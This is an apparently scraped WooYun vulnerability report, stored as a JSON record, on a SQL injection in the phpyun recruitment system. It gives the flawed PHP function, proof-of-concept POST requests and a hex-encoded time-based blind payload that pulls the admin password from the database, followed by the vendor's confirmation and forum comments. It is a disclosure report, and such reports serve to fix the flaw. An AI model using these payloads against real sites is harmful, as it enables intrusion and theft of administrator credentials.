{"id": 73375, "wybug_id": "wooyun-2015-0144194", "wybug_title": "phpyun最新版某处SQL注入", "wybug_corp": "php云人才系统", "wybug_author": "玉林嘎", "wybug_date": "2015-10-07 17:08", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： rt 详细说明：  phpyun最新版action.class.php下的FormatValues函数 已经做出了修改\nfunction FormatValues($Values){        $ValuesStr='';        foreach($Values as $k=>$v){            if(preg_match(\"/^[a-zA-Z0-9_]+$/\",$k))\t\t\t{\t\t\t\t if(preg_match('/^[0-9]+$/', $k)){\t\t\t\t\t$ValuesStr.=','.$v;\t\t\t\t}else{\t\t\t\t\t\t\t\t\t\t$ValuesStr.=',`'.$k.'`=\\''.$v.'\\'';\t\t\t\t\t\t\t\t\t}\t\t\t}        }        return substr($ValuesStr,1);    }\n修复了之前的利用方式 但是还是可以再次利用\nif(preg_match('/^[0-9]+$/', $k)){\t$ValuesStr.=','.$v;\n$key的值传入为数值的话 就会进入这个语句而$value就是 简单的拼接 $v无任何闭合那么我们就可以进行利用 利用地方存在多处 以之前为例    漏洞证明：  \nhttp://127.0.0.1/phpyun9/friend/c_saveinfo.html post:submitBtn=1&1=`nickname`=current_user\n\n\n\n\n出数据方法 利用hex绕过过滤 利用二次注入 出数据跟 WooYun: phpyun注入漏洞#2 一样\nhttp://127.0.0.1/phpyun9/friend/c_saveinfo.html post：submitBtn=1&1=`nickname`=0x272c69703d28534c454550284d4944282853454c4543542050415353574f52442046524f4d2070687079756e5f61646d696e5f75736572204c494d49542031292c312c31293d273227292923\n\n',ip=(SLEEP(MID((SELECT PASSWORD FROM phpyun_admin_user LIMIT 1),1,1)='2'))#\n\n\n\n\n   修复方案：  修复   版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-10-08 18:04 厂商回复： 感谢提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-07 18:06 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1593 漏洞数:230        | 闭关修炼易筋经)\t\t \n  打着比赛还挖洞？    \n     2015-10-07 18:10 |    \t\t玉林嘎  \t\t\t( 核心白帽子 |\t\t\t        Rank:915 漏洞数:105        )\t\t \n  @king7 9月份交的..    \n     2015-10-07 20:11 |    \t\tCheery \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 0.0)\t\t \n  恭喜恭喜！    \n     2015-10-07 22:24 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  可怕的嘎嘎    \n     2015-10-07 22:30 |    \t\t玉林嘎  \t\t\t( 核心白帽子 |\t\t\t        Rank:915 漏洞数:105        )\t\t \n  @roker 可啪的肉壳    \n     2015-10-07 23:00 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:262 漏洞数:67        | baozisec)\t\t \n  可怕的嘎嘎    \n     2015-10-09 23:13 |    \t\t撸管 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:6        | QQ94170844 不再玩wooyun)\t\t \n  @玉林嘎 我也是玉林嘎    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}